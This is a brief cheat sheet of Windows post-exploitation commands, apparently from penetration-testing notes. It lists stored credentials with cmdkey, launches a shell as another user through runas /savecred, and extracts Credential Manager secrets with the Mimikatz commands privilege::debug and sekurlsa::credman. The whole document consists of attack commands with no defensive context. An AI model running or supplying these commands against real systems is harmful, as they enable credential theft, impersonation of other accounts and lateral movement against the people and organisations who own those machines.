1) Enumerating credentials with cmdkey
```shell
cmdkey /list
```

2) Runas tool
```shell
runas /savecred /user:SRV01\mcharles cmd
```

2) Extracting credentials with Mimikatz
```shell
privilege::debug
sekurlsa::credman
```
